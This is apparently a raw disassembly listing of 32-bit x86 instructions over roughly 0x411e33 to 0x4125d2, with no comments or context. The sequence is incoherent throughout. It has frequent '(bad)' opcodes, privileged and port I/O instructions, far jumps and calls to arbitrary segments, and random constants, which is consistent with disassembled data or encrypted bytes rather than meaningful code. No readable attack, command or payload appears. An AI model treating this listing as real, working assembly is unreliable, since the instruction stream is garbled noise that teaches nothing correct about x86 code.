  411e33:	popf   
  411e34:	mov    esi,DWORD PTR [ecx+0x1d]
  411e37:	jecxz  0x411eab
  411e39:	jns    0x411de0
  411e3b:	jle    0x411ded
  411e3d:	jg     0x411dde
  411e3f:	push   0x6b
  411e41:	into   
  411e42:	inc    esi
  411e43:	sbb    al,0x4a
  411e45:	test   al,0xdd
  411e47:	mov    ch,0x8c
  411e49:	xchg   BYTE PTR [eax+0x4f],bl
  411e4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e4d:	mov    es:0x9934a62e,eax
  411e53:	sbb    BYTE PTR [ebp+0x5b],al
  411e56:	add    al,0xb4
  411e58:	jg     0x411ec6
  411e5a:	pop    edi
  411e5b:	mov    ds:0x124d61e7,al
  411e60:	inc    edi
  411e61:	pop    ecx
  411e62:	inc    edx
  411e63:	adc    eax,0xa65a9
  411e68:	push   edx
  411e69:	inc    ebp
  411e6a:	pop    ebx
  411e6b:	dec    ecx
  411e6c:	or     eax,0xf0517d4
  411e71:	xchg   esi,eax
  411e72:	cmp    ebx,DWORD PTR [ebp-0x486d85]
  411e78:	mov    ah,0xf0
  411e7a:	aam    0xe
  411e7c:	pop    ebp
  411e7d:	inc    edi
  411e7e:	stc    
  411e7f:	jmp    esp
  411e81:	shl    BYTE PTR [esi+ecx*4+0x2a],cl
  411e85:	jmp    0x9b68:0x2e10133
  411e8c:	aas    
  411e8d:	lahf   
  411e8e:	cli    
  411e8f:	pop    es
  411e90:	pop    eax
  411e91:	aad    0x92
  411e93:	xchg   ecx,eax
  411e94:	push   0xffffffdd
  411e96:	sbb    eax,DWORD PTR [edi]
  411e98:	repz pop ds
  411e9a:	xchg   edx,eax
  411e9b:	mov    eax,0x2e1c2691
  411ea0:	xchg   esi,eax
  411ea1:	jl     0x411e8d
  411ea3:	outs   dx,DWORD PTR ds:[esi]
  411ea4:	push   edx
  411ea5:	push   ebx
  411ea6:	ins    BYTE PTR es:[edi],dx
  411ea7:	push   es
  411ea8:	je     0x411e4d
  411eaa:	cwde   
  411eab:	xchg   DWORD PTR [esi+edi*2+0x2b],edx
  411eaf:	adc    BYTE PTR [edx-0xc],ch
  411eb2:	repz mov eax,0xe40b3f0c
  411eb8:	hlt    
  411eb9:	pop    edi
  411eba:	push   cs
  411ebb:	call   0xf382aaca
  411ec0:	(bad)  
  411ec1:	sub    eax,0x9d6f5023
  411ec6:	arpl   WORD PTR [ecx+0x7d],bx
  411ec9:	(bad)  
  411eca:	jbe    0x411ea6
  411ecc:	imul   edx,ecx,0xaccbf398
  411ed2:	test   eax,0xee30d205
  411ed7:	imul   edi,DWORD PTR [ebp-0x1],0x13
  411edb:	repnz out dx,eax
  411edd:	(bad)  
  411ede:	popf   
  411edf:	in     eax,0xc7
  411ee1:	hlt    
  411ee2:	fistp  WORD PTR [ecx+0x6a0d8b77]
  411ee8:	pop    ebx
  411ee9:	scas   eax,DWORD PTR es:[edi]
  411eea:	bound  edx,QWORD PTR [ebx]
  411eec:	cmp    eax,0xc6a27ff3
  411ef1:	ret    0x512a
  411ef4:	das    
  411ef5:	add    bl,BYTE PTR gs:[esi+0x4]
  411ef9:	cmp    eax,0x1267b17d
  411efe:	adc    DWORD PTR [ecx-0x7dfc176b],edx
  411f04:	outs   dx,BYTE PTR ds:[esi]
  411f05:	into   
  411f06:	sbb    BYTE PTR [eax-0x5c],bl
  411f09:	mov    dl,0x0
  411f0b:	jbe    0x411f51
  411f0d:	sbb    bh,BYTE PTR [esi]
  411f0f:	xchg   esp,eax
  411f10:	mov    BYTE PTR [eax-0x4c5e6a03],ch
  411f16:	into   
  411f17:	xchg   esp,eax
  411f18:	mov    edx,0x18b98b8b
  411f1d:	in     al,dx
  411f1e:	xor    bh,bh
  411f20:	imul   edx,DWORD PTR [edi],0x0
  411f23:	(bad)  
  411f24:	jbe    0x411ed7
  411f26:	mov    ds:0xdc60aeac,eax
  411f2b:	shl    BYTE PTR [esi-0x12],0x44
  411f2f:	inc    ebp
  411f30:	hlt    
  411f31:	cwde   
  411f32:	jmp    0x411f38
  411f34:	dec    esi
  411f35:	outs   dx,BYTE PTR ds:[esi]
  411f36:	aam    0xb3
  411f38:	jge    0x411fab
  411f3a:	or     al,0x59
  411f3c:	xchg   esp,eax
  411f3d:	dec    esi
  411f3e:	ret    0x2d82
  411f41:	or     BYTE PTR [ebp+0x78],cl
  411f44:	and    DWORD PTR [esi-0x5e],0xb
  411f48:	xchg   esp,eax
  411f49:	test   esi,eax
  411f4b:	or     BYTE PTR [edx+0x4fc19286],dh
  411f51:	lahf   
  411f52:	sbb    bl,al
  411f54:	jl     0x411f21
  411f56:	mov    al,BYTE PTR [eax+0x3c]
  411f59:	out    dx,al
  411f5a:	xchg   esp,eax
  411f5b:	jge    0x411fc3
  411f5d:	sbb    DWORD PTR [edi+0x1e],ebx
  411f60:	jns    0x411f4d
  411f62:	test   ch,dh
  411f64:	dec    esi
  411f65:	lds    esp,FWORD PTR [ebx]
  411f67:	(bad)
  411f6a:	push   es
  411f6b:	pop    edx
  411f6c:	inc    ecx
  411f6d:	fucomip st,st(2)
  411f6f:	pop    ss
  411f70:	daa    
  411f71:	ds adc eax,0xd752f892
  411f77:	add    DWORD PTR [edx],ecx
  411f79:	out    0x34,eax
  411f7b:	xor    BYTE PTR [ebp-0x4d],al
  411f7e:	mov    DWORD PTR [edx],edx
  411f80:	inc    ebp
  411f81:	sbb    esi,ebx
  411f83:	mov    ecx,0xd066bd91
  411f88:	jbe    0x411f42
  411f8a:	sbb    DWORD PTR [eax+0x3bf179fe],ebx
  411f90:	bound  edx,QWORD PTR [edi+0x1d87f84e]
  411f96:	sub    BYTE PTR [ecx+0x8],ah
  411f99:	pop    ebp
  411f9a:	in     eax,dx
  411f9b:	mov    ebp,0x58f68303
  411fa0:	sbb    eax,0xa0bf31ab
  411fa5:	mov    ?,esp
  411fa7:	lods   al,BYTE PTR ds:[esi]
  411fa8:	mov    cs,esi
  411faa:	out    0xcf,al
  411fac:	xor    ebp,DWORD PTR [ebp+0x21697f8a]
  411fb2:	(bad)  
  411fb3:	repnz aam 0x8a
  411fb6:	out    dx,eax
  411fb7:	push   cs
  411fb8:	daa    
  411fb9:	mov    bx,0xd9c8
  411fbd:	leave  
  411fbe:	inc    esp
  411fbf:	fs test eax,0xaf22a96f
  411fc5:	cmp    DWORD PTR [ebp+eiz*8+0x5bdd1e56],ebp
  411fcc:	mov    dl,BYTE PTR [ebp+0x2d]
  411fcf:	jbe    0x411fd9
  411fd1:	mov    ebx,0xdfa9ecb1
  411fd6:	inc    edx
  411fd7:	jmp    0xc315:0x15bbcbd3
  411fde:	(bad)  
  411fdf:	into   
  411fe0:	pop    edx
  411fe1:	push   eax
  411fe2:	and    bh,cl
  411fe4:	or     bh,dh
  411fe6:	loopne 0x412008
  411fe8:	cmp    eax,0x357f5d3f
  411fed:	mov    ecx,0xfa01ac70
  411ff2:	lahf   
  411ff3:	loopne 0x412005
  411ff5:	call   0x1a34:0xd8d02
  411ffc:	out    0x62,al
  411ffe:	mov    al,ds:0x8a2fb35
  412003:	push   0xfffffffa
  412005:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412006:	scas   eax,DWORD PTR es:[edi]
  412007:	nop
  412008:	shr    BYTE PTR [ebp-0x435781a0],cl
  41200e:	lods   eax,DWORD PTR ds:[esi]
  41200f:	or     edx,DWORD PTR [ecx+0x6a]
  412012:	inc    edx
  412013:	repz aam 0x2b
  412016:	enter  0xc36e,0xf7
  41201a:	fld    QWORD PTR [ebx]
  41201c:	dec    ebx
  41201d:	popf   
  41201e:	add    edx,DWORD PTR [ecx]
  412020:	call   0x1f05:0xacc3018a
  412027:	sbb    ebx,ebp
  412029:	xor    bl,ch
  41202b:	push   ecx
  41202c:	push   ebx
  41202d:	loopne 0x412048
  41202f:	das    
  412030:	retf   
  412031:	bound  eax,QWORD PTR [edx+0x46]
  412034:	mul    DWORD PTR [esi+edi*2-0x310a9cc0]
  41203b:	push   es
  41203c:	jl     0x41200e
  41203e:	pop    ebx
  41203f:	add    al,0xa1
  412041:	outs   dx,DWORD PTR ds:[esi]
  412042:	add    esp,ebx
  412044:	mov    eax,0x946c22bd
  412049:	rcl    DWORD PTR [esp+esi*4+0x1],1
  41204d:	stc    
  41204e:	add    bh,ch
  412050:	jle    0x41208c
  412052:	lahf   
  412053:	mov    ch,0x87
  412055:	shr    DWORD PTR [esi-0x24],1
  412058:	sub    al,0x49
  41205a:	fld    QWORD PTR [ebx]
  41205c:	jmp    0x411fe9
  41205e:	mov    ecx,0x213256b5
  412063:	jo     0x412060
  412065:	adc    eax,0x7e68126f
  41206a:	stc    
  41206b:	dec    ebx
  41206c:	mov    edi,DWORD PTR [eax+0x2ed63ba2]
  412072:	aas    
  412073:	pop    ebx
  412074:	sahf   
  412075:	scas   eax,DWORD PTR es:[edi]
  412076:	adc    ch,bh
  412078:	jno    0x412053
  41207a:	retf   0x8188
  41207d:	das    
  41207e:	or     bl,BYTE PTR [edx+0x42]
  412081:	fucom  st(3)
  412083:	lods   al,BYTE PTR ds:[esi]
  412084:	dec    edi
  412085:	(bad)  
  412087:	ins    BYTE PTR es:[edi],dx
  412088:	dec    ebx
  412089:	mov    es,WORD PTR [edi-0x73]
  41208c:	xor    BYTE PTR [eax+0x325c4153],dh
  412092:	mov    ds:0x32473089,eax
  412097:	imul   BYTE PTR [ecx]
  412099:	dec    ebp
  41209b:	push   ecx
  41209c:	cmc    
  41209d:	inc    eax
  41209e:	mov    bl,0xd6
  4120a0:	imul   ebp,DWORD PTR [eax+eiz*1],0xef246ab6
  4120a7:	test   eax,0xd65ddebb
  4120ac:	sar    al,0xdb
  4120af:	fs pop es
  4120b1:	jnp    0x4120ff
  4120b3:	das    
  4120b4:	mov    DWORD PTR [edi-0x1e],ebx
  4120b7:	repnz clc 
  4120b9:	inc    ebp
  4120ba:	push   cs
  4120bb:	imul   esi,DWORD PTR [ecx],0xffffffb3
  4120be:	sbb    eax,0xf459a62a
  4120c3:	add    BYTE PTR [esi-0x22],bl
  4120c6:	inc    eax
  4120c7:	xchg   ebx,eax
  4120c8:	int3   
  4120c9:	std    
  4120ca:	clc    
  4120cb:	jne    0x4120f6
  4120cd:	inc    ebx
  4120ce:	(bad)  
  4120cf:	stos   BYTE PTR es:[edi],al
  4120d0:	cmp    eax,DWORD PTR [esi-0x43]
  4120d3:	in     eax,dx
  4120d4:	mov    DWORD PTR [ebp+0x7d],esp
  4120d7:	jp     0x4120b4
  4120d9:	pop    esi
  4120da:	pop    edi
  4120db:	mov    ebp,0x423a8c2c
  4120e0:	pop    edi
  4120e1:	dec    ecx
  4120e2:	adc    al,0x25
  4120e4:	mov    ?,WORD PTR [ebx-0x7b87ebb7]
  4120ea:	retf   
  4120eb:	mov    bh,0x4a
  4120ed:	cmp    bl,BYTE PTR [ecx]
  4120ef:	fcmovnu st,st(2)
  4120f1:	mov    cl,0x6d
  4120f3:	push   edi
  4120f4:	fistp  DWORD PTR [ebx-0x19]
  4120f7:	pop    ds
  4120f8:	cmp    DWORD PTR [ecx-0x14aed8bf],edi
  4120fe:	jmp    0x41210a
  412100:	pop    fs
  412102:	pop    ss
  412103:	push   es
  412104:	xchg   BYTE PTR [ebp+0x7585c21b],ch
  41210a:	imul   ecx,DWORD PTR [eax],0x4b1b380d
  412110:	popa   
  412111:	cmc    
  412112:	xchg   ecx,eax
  412113:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412114:	js     0x41212a
  412116:	cmp    DWORD PTR [esi],edx
  412118:	nop
  412119:	push   edx
  41211a:	pop    ss
  41211b:	stos   BYTE PTR es:[edi],al
  41211c:	enter  0xf1ff,0xbf
  412120:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412121:	daa    
  412122:	xchg   edx,eax
  412123:	push   esp
  412124:	adc    eax,0x8b98ac6
  412129:	xor    al,0x17
  41212b:	jo     0x412196
  41212d:	mov    ds:0x79ba56c2,eax
  412132:	sub    esi,eax
  412134:	jb     0xc25fedf3
  41213a:	rol    DWORD PTR [eax],cl
  41213c:	xchg   ebp,eax
  41213d:	test   DWORD PTR [esi],esi
  41213f:	jne    0x412123
  412141:	sbb    eax,0x53dadd6a
  412146:	iret   
  412147:	mov    ebx,DWORD PTR [ebp-0x39]
  41214a:	or     al,0xf7
  41214c:	push   esi
  41214d:	(bad)  
  41214e:	xor    esi,ebx
  412150:	xchg   esp,eax
  412151:	outs   dx,DWORD PTR ds:[esi]
  412152:	and    ecx,DWORD PTR [ebx+0x5e970d0b]
  412158:	pop    eax
  412159:	push   ds
  41215a:	fstp   DWORD PTR [eax]
  41215c:	push   edx
  41215d:	add    ch,BYTE PTR [edi+0x4339200e]
  412163:	fcmovnb st,st(7)
  412165:	loope  0x412102
  412167:	and    dl,0x6c
  41216a:	adc    dl,BYTE PTR [eax]
  41216c:	pop    esp
  41216d:	or     al,0xd
  41216f:	sub    al,dh
  412171:	and    al,0x52
  412173:	shr    ecx,cl
  412175:	jne    0x412187
  412177:	pop    es
  412178:	jae    0x41212d
  41217a:	fldenv [edi+0x6d]
  41217d:	arpl   WORD PTR [ebp+0x6d3f1eb2],bx
  412183:	frstor [edx-0x682d5abe]
  412189:	cmp    bh,bl
  41218b:	jmp    0x4121eb
  41218d:	ret    
  41218e:	inc    edx
  41218f:	jmp    FWORD PTR [ecx+0x33e4fb85]
  412195:	mov    esp,0x2493cd0f
  41219a:	popf   
  41219b:	fstp   QWORD PTR [esi-0x78]
  41219e:	mov    bh,0xb9
  4121a0:	adc    BYTE PTR [eax],bl
  4121a2:	(bad)  
  4121a3:	nop
  4121a4:	cli    
  4121a5:	(bad)  
  4121a6:	inc    DWORD PTR [esi+0x1ce07872]
  4121ac:	mul    BYTE PTR [ebp-0x108352d4]
  4121b2:	and    al,0x2e
  4121b4:	pop    edi
  4121b5:	dec    eax
  4121b6:	or     ebx,ebx
  4121b8:	push   edi
  4121b9:	inc    ebp
  4121ba:	je     0x4121f8
  4121bc:	fdivr  QWORD PTR [edx+0x56]
  4121bf:	mov    WORD PTR [ebx],?
  4121c1:	into   
  4121c2:	(bad)  
  4121c3:	and    al,0xcb
  4121c5:	shr    ecx,1
  4121c7:	cli    
  4121c8:	add    ecx,DWORD PTR [esi+edi*1+0x13658e13]
  4121cf:	mov    DWORD PTR [edx+0x6c],0x59e4818b
  4121d6:	mov    eax,ds:0xefec554e
  4121db:	push   esp
  4121dc:	and    BYTE PTR ds:0x4a5b1d58,cl
  4121e2:	mov    dl,0xc3
  4121e4:	xor    eax,0x5d7c1d49
  4121e9:	out    0xa7,eax
  4121eb:	aam    0x44
  4121ed:	lods   eax,DWORD PTR ds:[esi]
  4121ee:	jnp    0x412220
  4121f0:	mov    edx,0xa5bc9f83
  4121f5:	sbb    edx,ebp
  4121f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121f8:	punpcklbw mm7,DWORD PTR [edx+eax*4-0x2a14adce]
  412200:	scas   al,BYTE PTR es:[edi]
  412201:	out    0xfa,al
  412203:	sub    eax,DWORD PTR [eax-0x57c54829]
  412209:	and    dh,bl
  41220b:	mov    esi,0x639a67b8
  412210:	pop    ebx
  412211:	sbb    al,0x2
  412213:	test   eax,0x402fde9f
  412218:	sub    ah,ch
  41221a:	in     eax,dx
  41221b:	call   0x27886533
  412220:	mov    ah,0x1d
  412222:	aad    0x59
  412224:	push   eax
  412225:	xor    DWORD PTR ds:0x387223bb,edi
  41222b:	xchg   ebp,eax
  41222c:	test   DWORD PTR [eax+0x6f],eax
  41222f:	xchg   esi,eax
  412230:	push   ebp
  412231:	adc    ah,cl
  412233:	dec    esp
  412234:	cmc    
  412235:	push   eax
  412236:	sub    ah,dh
  412238:	push   esi
  412239:	add    ecx,DWORD PTR ds:0x1b9db3e1
  41223f:	aaa    
  412240:	stos   DWORD PTR es:[edi],eax
  412241:	mov    ebp,0xd7fbfafe
  412246:	mov    esp,0x5d5c1e80
  41224b:	pop    esp
  41224c:	cmp    ebp,DWORD PTR [eax-0x37163454]
  412252:	push   ss
  412253:	cmp    dh,0x18
  412256:	retf   
  412257:	jno    0x41220f
  412259:	mov    ds:0xe6a3fa7c,eax
  41225e:	sub    eax,0x53383da9
  412263:	dec    esp
  412264:	outs   dx,DWORD PTR ds:[esi]
  412265:	mov    cl,0x13
  412267:	aas    
  412268:	fild   DWORD PTR [esi]
  41226a:	xchg   ebp,eax
  41226b:	mov    WORD PTR [ecx-0x7c],gs
  41226e:	aad    0x59
  412270:	std    
  412271:	pop    edx
  412272:	fstp   QWORD PTR [ebx+0x2]
  412275:	jle    0x412288
  412277:	ins    DWORD PTR es:[edi],dx
  412278:	inc    edx
  412279:	jbe    0x4122c4
  41227b:	mov    eax,ds:0x33b3e9bf
  412280:	shr    DWORD PTR [esi+0x27],1
  412283:	xchg   edi,eax
  412284:	test   DWORD PTR [ebx],0x775caaf5
  41228a:	mov    ch,0xe4
  41228c:	adc    dl,dh
  41228e:	mov    ecx,0x7f2da673
  412293:	cmp    BYTE PTR [edi+0x3f9e8369],0xaa
  41229a:	xchg   esi,eax
  41229b:	pop    ebx
  41229c:	call   DWORD PTR [ecx+0x20]
  41229f:	or     BYTE PTR [ebp+0x9],ch
  4122a2:	push   edx
  4122a3:	mov    al,ds:0xc3a38c4e
  4122a8:	cli    
  4122a9:	jnp    0x4122e3
  4122ab:	ret    
  4122ac:	mov    WORD PTR [esi+eax*2-0x726929d8],cs
  4122b3:	xlat   BYTE PTR ds:[ebx]
  4122b4:	jns    0x412248
  4122b6:	mov    edx,fs
  4122b8:	aaa    
  4122b9:	cmp    DWORD PTR [ecx-0x2b],ebp
  4122bc:	outs   dx,BYTE PTR ds:[esi]
  4122bd:	stc    
  4122be:	repz ret 
  4122c0:	sbb    bh,BYTE PTR [ebx+0x6444dae0]
  4122c6:	mov    ds:0x435c6455,al
  4122cb:	inc    ebx
  4122cc:	sub    dl,bl
  4122ce:	mov    cl,0x4f
  4122d0:	and    ecx,DWORD PTR [edi+0x75]
  4122d3:	or     DWORD PTR [ecx+0x7a],0xc9e301c0
  4122da:	fdivrp st(6),st
  4122dc:	mov    ebx,0x4c4b99f8
  4122e1:	xlat   BYTE PTR ds:[ebx]
  4122e2:	pop    edi
  4122e3:	jne    0x4122b9
  4122e5:	sbb    bl,BYTE PTR ds:0x3a5394fb
  4122eb:	arpl   ax,ax
  4122ed:	and    DWORD PTR [ebx-0x201a6d68],eax
  4122f3:	fdivp  st(3),st
  4122f5:	int3   
  4122f6:	imul   edi,DWORD PTR fs:[esi],0x358c63ef
  4122fd:	(bad)  
  4122ff:	sub    eax,DWORD PTR [edx+0x3ddd3cb6]
  412305:	jae    0x41229d
  412307:	inc    ebx
  412308:	inc    edi
  412309:	fimul  WORD PTR [esp+ebp*8+0xe60c14f]
  412310:	mov    dl,0xa2
  412312:	sar    BYTE PTR [ecx+0x695eacfe],cl
  412318:	mov    bl,0x64
  41231a:	shr    DWORD PTR [ebx],1
  41231c:	lahf   
  41231d:	ds dec esi
  41231f:	and    ecx,DWORD PTR [ecx-0x2060bb1]
  412325:	out    dx,eax
  412326:	xor    eax,0xec26fa4c
  41232b:	jmp    0x6589:0x6a6d9c41
  412332:	dec    ebp
  412333:	lds    edi,FWORD PTR [ebx+edx*8]
  412336:	fild   DWORD PTR [eax-0x1f]
  412339:	aas    
  41233a:	xor    edx,DWORD PTR [ecx-0x46]
  41233d:	inc    ecx
  41233e:	aaa    
  41233f:	pop    edx
  412340:	inc    ecx
  412341:	sub    eax,0x8ed8820c
  412346:	imul   esi,DWORD PTR [ebx],0x40
  412349:	stc    
  41234a:	pop    esp
  41234b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41234c:	pop    esi
  41234d:	cmp    BYTE PTR [ebp+0x33fcb0],ch
  412353:	mov    ds:0xb23a80d6,al
  412358:	fadd   QWORD PTR [esi+0x26]
  41235b:	test   DWORD PTR gs:[ecx-0x422f8498],esp
  412362:	mov    ah,0xd3
  412364:	fsub   st,st(7)
  412366:	fwait
  412367:	lods   al,BYTE PTR ds:[esi]
  412368:	push   eax
  412369:	bound  edx,QWORD PTR [esp+edx*8]
  41236c:	je     0x4122f4
  41236e:	mov    edx,ecx
  412370:	sahf   
  412371:	lods   eax,DWORD PTR ds:[esi]
  412372:	inc    ebp
  412373:	retf   0xb7cc
  412376:	dec    ecx
  412377:	sub    edx,edx
  412379:	pop    edx
  41237a:	xchg   edx,eax
  41237b:	push   eax
  41237c:	es (bad) 
  41237f:	jp     0x412340
  412381:	and    eax,DWORD PTR [esi]
  412383:	or     BYTE PTR [ecx-0x394ff49b],0x3f
  41238a:	xchg   ebx,eax
  41238b:	popf   
  41238c:	jno    0x4123eb
  41238e:	mov    dl,0x1c
  412390:	or     dl,BYTE PTR [esi+0x67]
  412393:	inc    esp
  412394:	out    0x49,al
  412396:	das    
  412397:	dec    ebx
  412398:	adc    BYTE PTR [ebp-0x3a],ch
  41239b:	popa   
  41239c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41239d:	jg     0x4123ed
  41239f:	inc    esp
  4123a0:	into   
  4123a1:	jne    0x412345
  4123a3:	scas   eax,DWORD PTR es:[edi]
  4123a4:	or     BYTE PTR [esi+0x1b],dh
  4123a7:	je     0x412337
  4123a9:	retf   
  4123aa:	xor    esp,DWORD PTR [eax-0x5197831d]
  4123b0:	shl    DWORD PTR [ebp-0x54],1
  4123b3:	pop    esi
  4123b4:	sahf   
  4123b5:	xlat   BYTE PTR ds:[ebx]
  4123b6:	add    DWORD PTR [esi+0xd],ebp
  4123b9:	jl     0x41242a
  4123bb:	fbstp  TBYTE PTR [edi]
  4123bd:	push   0x329d92e5
  4123c2:	mov    ch,0xb8
  4123c4:	lahf   
  4123c5:	dec    esp
  4123c6:	dec    DWORD PTR [ebx]
  4123c8:	out    dx,eax
  4123c9:	jbe    0x4123ac
  4123cb:	xor    BYTE PTR [ebx-0xb],cl
  4123ce:	xchg   ebp,eax
  4123cf:	mov    edi,esi
  4123d1:	mov    eax,0xd21fecd6
  4123d6:	mov    DWORD PTR [edx+0x2a],ebp
  4123d9:	(bad)  [esp+ecx*2+0x9]
  4123dd:	js     0x4123d3
  4123df:	popf   
  4123e0:	not    DWORD PTR [edx-0x2d]
  4123e3:	leave  
  4123e4:	xor    dl,BYTE PTR [edx]
  4123e6:	jne    0x4123be
  4123e8:	mov    ds:0x50688e08,al
  4123ed:	aam    0xc7
  4123ef:	js     0x4123ae
  4123f1:	mov    ah,0x2c
  4123f3:	(bad)  
  4123f4:	rcl    DWORD PTR [esi+0x3b],1
  4123f7:	cli    
  4123f8:	jecxz  0x412444
  4123fa:	mov    esp,fs
  4123fc:	and    al,0xe0
  4123fe:	pop    ebp
  4123ff:	dec    ecx
  412400:	pusha  
  412401:	in     al,0x62
  412403:	ins    BYTE PTR es:[edi],dx
  412404:	aad    0x17
  412406:	sub    al,0x18
  412408:	out    dx,al
  412409:	repnz rcr DWORD PTR [edx-0x20],1
  41240d:	or     al,0x83
  41240f:	push   ss
  412410:	add    eax,DWORD PTR [eax+0x33]
  412413:	test   bl,0x74
  412416:	sub    dl,0x1d
  412419:	jmp    0x41243f
  41241b:	pop    edi
  41241c:	stos   DWORD PTR es:[edi],eax
  41241d:	fistp  QWORD PTR [esi-0x3f241bce]
  412423:	les    ecx,FWORD PTR [edx-0x2b]
  412426:	std    
  412427:	push   esp
  412428:	xor    dh,BYTE PTR [edi-0x5b]
  41242b:	inc    esp
  41242c:	adc    eax,0x800969ff
  412431:	and    DWORD PTR [eax+0x14],ecx
  412434:	lahf   
  412435:	inc    ecx
  412436:	push   ebp
  412437:	cdq    
  412438:	jle    0x4123d8
  41243a:	xchg   ebp,eax
  41243b:	(bad)  
  41243c:	shr    BYTE PTR [ebx+0x3787b2d4],1
  412442:	shl    ecx,1
  412444:	fistp  DWORD PTR [edx+0x7]
  412447:	cld    
  412448:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412449:	sub    esi,esi
  41244b:	mov    eax,0x315fee5a
  412450:	inc    ecx
  412451:	imul   esi,DWORD PTR [esi+eiz*1],0x864d5e76
  412458:	xor    al,0xd7
  41245a:	(bad)  
  41245b:	jmp    0xe519:0xdcf5d329
  412462:	aas    
  412463:	push   0xffffffbd
  412465:	lock lods eax,DWORD PTR ds:[esi]
  412467:	dec    eax
  412468:	call   0xf654e37b
  41246d:	jmp    0xf3821f94
  412472:	jecxz  0x412491
  412474:	jp     0x4124ab
  412476:	jle    0x4124f5
  412478:	loop   0x412432
  41247a:	sub    edi,edi
  41247c:	fist   DWORD PTR [ebx+0xe406db7]
  412482:	int3   
  412483:	and    eax,0xd05486fb
  412488:	mov    al,ds:0x178bc57
  41248d:	scas   eax,DWORD PTR es:[edi]
  41248e:	xchg   DWORD PTR [esi-0xf5b1b49],esp
  412494:	mov    eax,ds:0x866947b2
  412499:	ret    
  41249a:	mov    edi,0xd6dcd663
  41249f:	fcmovnbe st,st(4)
  4124a1:	jno    0x412477
  4124a3:	xchg   esp,eax
  4124a4:	mov    dh,0x7b
  4124a6:	cmp    esp,esp
  4124a8:	jns    0x41249a
  4124aa:	cmc    
  4124ab:	pop    esi
  4124ac:	jle    0x412497
  4124ae:	scas   eax,DWORD PTR es:[edi]
  4124af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124b0:	leave  
  4124b1:	jg     0x4124fb
  4124b3:	push   edi
  4124b4:	mov    esp,0x1c22639f
  4124b9:	push   esi
  4124ba:	mov    BYTE PTR [eax],ah
  4124bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124bd:	lods   al,BYTE PTR ds:[esi]
  4124be:	push   edx
  4124bf:	mov    BYTE PTR [ecx+0x242457ca],bl
  4124c5:	fild   WORD PTR [ecx+0x7d]
  4124c8:	imul   edi,ecx,0x3a
  4124cb:	add    esi,DWORD PTR [ebp+ebp*8-0x65a594ab]
  4124d2:	ins    DWORD PTR es:[edi],dx
  4124d3:	push   ds
  4124d4:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4124d6:	shr    BYTE PTR [esi+ecx*4+0x3c],1
  4124da:	in     eax,dx
  4124db:	jns    0x412477
  4124dd:	inc    esp
  4124de:	stos   DWORD PTR es:[edi],eax
  4124df:	call   0x1236:0x36a522a5
  4124e6:	fwait
  4124e7:	sbb    al,ch
  4124e9:	mov    BYTE PTR [ecx],dl
  4124eb:	clc    
  4124ec:	or     BYTE PTR [esi+0x68],ch
  4124ef:	sub    eax,0x3772c070
  4124f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124f6:	cli    
  4124f7:	push   esp
  4124f8:	mov    dl,0xaf
  4124fa:	sub    eax,0x16cbef58
  4124ff:	(bad)  
  412501:	pop    ecx
  412502:	retf   
  412503:	aam    0x67
  412505:	call   0xc5ca:0x26cf69b7
  41250c:	lahf   
  41250d:	pop    ss
  41250e:	aad    0x4d
  412510:	aaa    
  412511:	push   ebx
  412512:	jge    0x412567
  412514:	popa   
  412515:	push   0xffffffdb
  412517:	pop    es
  412518:	and    bh,BYTE PTR [esi+0x40742154]
  41251e:	rcl    esp,1
  412520:	xchg   edi,eax
  412521:	call   0xe9fe37ee
  412526:	jg     0x41254a
  412528:	cmp    esp,DWORD PTR [ecx+0x77]
  41252b:	call   0x94fdbe99
  412530:	xor    al,0x1a
  412533:	jae    0x412547
  412535:	push   0x5695db16
  41253a:	stos   DWORD PTR es:[edi],eax
  41253b:	(bad)  ds:0x4c578e5f
  412541:	inc    esi
  412542:	sbb    ebx,esp
  412544:	xchg   ebp,eax
  412545:	sub    al,0xf4
  412547:	ds inc esi
  412549:	pop    ds
  41254a:	call   0x1296c687
  41254f:	inc    esp
  412550:	arpl   WORD PTR [esi],di
  412552:	mov    dl,0x27
  412554:	out    0x2d,al
  412556:	pop    ds
  412557:	lods   eax,DWORD PTR ds:[esi]
  412558:	iret   
  412559:	mov    esp,0xfdc448bf
  41255e:	loopne 0x412564
  412560:	test   eax,0x33ecd4b9
  412565:	(bad)  
  412566:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412567:	push   eax
  412568:	imul   ebp,DWORD PTR [edx+0x7810e337],0x4437122e
  412572:	aaa    
  412573:	jne    0x41258e
  412575:	(bad)  
  412577:	mov    ebp,?
  412579:	jl     0x41257c
  41257b:	popa   
  41257c:	lds    edi,FWORD PTR [ecx+0x27]
  41257f:	pop    esi
  412580:	neg    BYTE PTR [eax+edi*1-0x233a9392]
  412587:	retf   
  412588:	mov    al,ds:0x1e8f7a28
  41258d:	in     eax,0x43
  41258f:	add    eax,0x620216bc
  412594:	fnstcw WORD PTR gs:[eax]
  412597:	aaa    
  412598:	push   ss
  412599:	mov    cl,0x73
  41259b:	xlat   BYTE PTR ds:[ebx]
  41259c:	mov    cl,0x98
  41259e:	jnp    0x4125a2
  4125a0:	aas    
  4125a1:	call   0x434814c4
  4125a6:	stos   BYTE PTR es:[edi],al
  4125a7:	test   DWORD PTR [esi],ebx
  4125a9:	inc    esp
  4125aa:	push   edi
  4125ab:	pop    ss
  4125ac:	adc    bl,al
  4125ae:	xor    bh,BYTE PTR [ebx+0x12]
  4125b1:	fwait
  4125b2:	or     al,0x92
  4125b4:	and    al,0xf4
  4125b6:	out    0x62,eax
  4125b8:	out    dx,al
  4125b9:	jno    0x41257f
  4125bb:	xor    DWORD PTR [esi-0x48],0x4c681117
  4125c2:	add    ebx,0xeeb83552
  4125c8:	inc    eax
  4125c9:	adc    al,0x3f
  4125cb:	and    bh,dh
  4125cd:	aam    0xec
  4125cf:	retf   
  4125d0:	popa   
  4125d1:	hlt    
  4125d2:	je     0x412601
